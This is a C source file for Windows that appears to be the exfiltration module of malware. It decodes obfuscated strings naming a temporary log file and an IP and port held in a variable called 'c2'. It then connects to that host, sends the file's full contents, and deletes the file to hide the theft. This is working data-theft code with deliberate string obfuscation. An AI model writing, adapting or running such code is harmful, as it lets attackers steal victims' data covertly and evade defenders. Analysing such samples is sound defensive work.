#include <stdio.h>
#include <ws2tcpip.h>
#include <winsock.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <stdlib.h>

#include "io.h"

#pragma comment(lib, "ws2_32.lib")

int sock;
struct addrinfo hints, *c2;

char b[3][32] = { 0 };
char *a[] = { "I@b]otju}ybZksvbrum4z~z", "7?847<>48479", "9:?6" };

int decrypt(const char* string, char result[])
{
	int key = 6;
	int len = strlen(string);

	for (int n = 0; n < len; n++) {
		int symbol = string[n];
		int e_symbol = symbol - key;
		result[n] = e_symbol;
	}
	result[len] = '\0';

	return 0;
}

int socket_setup(void) {

	for (int n = 0; n < 3; n++)
	{
		decrypt(a[n], b[n]);
	}

	// WSAData wsaData;
	WSADATA wsaData;

	// Startup WSA stuff
	if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0)
	{
		return 1;
	}

	// ensure that hints struct is empty
	memset(&hints, 0, sizeof(hints));

	// fill out hints with relevant wants
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;

	// use getaddrinfo to fill out the rest of the struct
	getaddrinfo("192.168.2.13", "3490", &hints, &c2);
	//getaddrinfo(b[1], b[2], &hints, &c2); #obfuscated version

	// create socket
	if ((sock = socket(c2->ai_family, c2->ai_socktype, c2->ai_protocol)) == INVALID_SOCKET)
	{
		socket_cleanup();
		return 1;
	}

	return 0;
}

int socket_connect(void)
{
	// connect to server
	if (connect(sock, c2->ai_addr, c2->ai_addrlen) < 0)
	{
		socket_cleanup();
		return 1;
	}

	return 0;
}

int socket_sendfile(void)
{
	int err = 0;
	int res = 0;

	DWORD bytes_read = 0;

	char file_size[12] = { 0 };

	HANDLE out_file = NULL;

	LARGE_INTEGER fsize;

	out_file = CreateFile((LPCWSTR)b[0], GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (out_file == INVALID_HANDLE_VALUE)
	{
		err = GetLastError();
		return 1;
	}

	// get file size	
	if (res = GetFileSizeEx(out_file, &fsize) == 0)
	{
		err = GetLastError();
		return 1;
	}

	// transform file size to string	
	sprintf_s(file_size, sizeof(file_size), "%lld", fsize.QuadPart);

	// allocate buffer for size of file plus 1
	void *read_buffer = calloc((fsize.QuadPart + 1), sizeof(char));
	if (read_buffer == NULL)
	{
		return 1;
	}

	// read file into buffer
	if (res = ReadFile(out_file, read_buffer, fsize.QuadPart, &bytes_read, NULL) == 0)
	{
		return 1;
	}

	// send file to server	
	res = send(sock, (CONST char*) read_buffer, fsize.QuadPart, 0);

	if (res <= 0)
	{
		return 1;
	}


	free(read_buffer);
	CloseHandle(out_file);
	DeleteFile((LPCWSTR)b[0]);
	return 0;
}

int socket_cleanup(void)
{
	// close socket and clean up
	closesocket(sock);
	WSACleanup();
	return 0;
}